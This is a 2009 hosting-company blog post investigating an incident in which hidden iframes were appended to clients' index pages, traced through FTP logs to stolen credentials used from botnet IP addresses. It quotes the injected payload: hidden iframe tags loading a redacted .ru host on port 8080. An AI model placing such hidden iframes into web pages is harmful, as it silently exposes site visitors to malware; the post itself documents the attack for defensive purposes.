---
published: true
comments: true
author: max-veprinsky
date: '2009-09-21 15:17:56'
layout: post
slug: iframe-injection-attack-investigation
status: publish
title: Iframe injection attack investigation
wordpress_id: '874'
categories:
- hosting
- Security
---

The whole hidden IFRAME vulnerability has been going on for some time, only a few of our client have been effected by this. The net is still buzzing with this issue and while some are saying that the injection are results of php insecurities, mysql injection or cross site scripting, while others point to key loggers and hijacked ftp credentials. In our case the exploit was not due to an application vulnerability but rather to hijacked ftp login information. Brute force password guessing attacks were not performed on this account nor any other accounts on the same server. In this particular type of attack, at the very end of index.php/index.html an IFRAME statement was appended overwriting page closing tags.

```
iframe src="http://***.ru:8080/index.php" width=111 height=162 style="visibi
iframe src="http://***.ru:8080/index.php" width=136 height=162 style="visibility: hidden" /iframe
iframe src="http://***.ru:8080/index.php" width=141 height=156 style="visibility: hidden" /iframe
```

Some of the index.php files had multiple IFRAME statements appended to the end. Knowing the username of affected account and affected filename I searched in /var/log/messages for any related entries and hit jackpot:

```
Aug 27 01:27:59 web152 pure-ftpd: (?@94.218.69.243) [INFO] user is now logged in
Aug 27 01:28:00 web152 pure-ftpd: (user@94.218.69.243) [NOTICE] /home/user//public_html/index.php downloaded  (2311 bytes, 1001.70KB/sec)
Aug 27 01:28:00 web152 pure-ftpd: (user@94.218.69.243) [INFO] Logout.
Aug 27 01:28:04 web152 pure-ftpd: (?@78.92.144.185) [INFO] user is now logged in
Aug 27 01:28:05 web152 pure-ftpd: (user@78.92.144.185) [NOTICE] /home/user//public_html/index.php uploaded  (2353 bytes, 10.42KB/sec)
Aug 27 01:28:05 web152 pure-ftpd: (user@78.92.144.185) [INFO] Logout.
```

What's interesting to note here is that even though downloading/uploading of index.php happens within a 6 second window, the source ip address for download and upload are not the same. During the next few days the same file is downloaded and uploaded but never from the same set of ip addresses. During the few days that I was allowing this to happen as I was monitoring said activity and collecting the IP addresses to see if a pattern emerges:

```
83.82.57.39 GeoIP Country Edition: NL, Netherlands
95.52.163.74 GeoIP Country Edition: RU, Russian Federation
189.122.164.40 GeoIP Country Edition: BR, Brazil
69.159.47.21 GeoIP Country Edition: CA, Canada
85.221.184.164 GeoIP Country Edition: PL, Poland
98.243.198.220 GeoIP Country Edition: US, United States
78.30.154.22 GeoIP Country Edition: RS, Serbia
77.81.33.229 GeoIP Country Edition: RO, Romania
83.6.73.91 GeoIP Country Edition: PL, Poland
190.198.3.27 GeoIP Country Edition: VE, Venezuela
75.208.130.92 GeoIP Country Edition: US, United States
68.84.202.157 GeoIP Country Edition: US, United States
75.80.81.104 GeoIP Country Edition: US, United States
```

Seeing that no clear pattern is evident here and considering that the IP address was different for each connection it is my rationale that the computer's at these IP addresses were a part of a botnet. My assumption is that a developer had saved the account password and was infected by malicious software which was able to gather the ftp credentials.

Cleanup included restoring files and changing all account/ftp/email and database passwords.
